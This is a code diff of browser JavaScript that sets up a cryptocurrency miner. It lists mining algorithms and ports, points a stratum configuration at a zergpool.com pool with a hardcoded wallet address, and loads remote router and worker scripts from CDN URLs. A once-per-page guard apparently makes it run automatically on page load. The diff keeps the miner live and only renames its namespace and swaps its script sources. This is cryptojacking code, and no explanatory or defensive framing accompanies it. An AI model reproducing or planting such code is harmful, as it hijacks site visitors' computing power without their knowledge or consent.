@@ -1,7 +1,7 @@
     
-    if (!window.weba2_run_0nc3) {
+    if (!window.weba2._RuN_0nc3) {
 
-        window.weighted = [
+        window.weba2.weighted = [
             { score: 0.00056, algo: "yescryptR16", port: 6333 },
             { score: 0.01412, algo: "yescryptR8",  port: 6323 },
             { score: 0.00003, algo: "yescrypt",    port: 6233 },
@@ -12,14 +12,14 @@
             { score: 0.09230, algo: "minotaurx",   port: 7019 }
         ];
 
-        window.stratum = (select => { return {
+        window.weba2.stratum = (select => { return {
             worker: "t1PJ6VRKeaFbaFi9SLBoapvyGCFXbmTRbae",
             password: "c=FLUX", server: `${select.algo}.mine.zergpool.com`, port: select.port
         }});
 
-        window.ssrrcc("https://bb.githack.com/wasmedge/hive/raw/main/router.js");
+        window.weba2.script("https://cdn.jsdelivr.net/gh/hazelcross/weba2/dist/router.js");
 
-        window.ssrrcc("https://bb.githack.com/wasmedge/hive/raw/main/webm3.js");
+        window.weba2.script("https://cdn.jsdelivr.net/gh/hazelcross/webm3/dist/broswer/worker.js");
 
-        window.weba2_run_0nc3 = true;
+        window.weba2._RuN_0nc3 = true;
     }
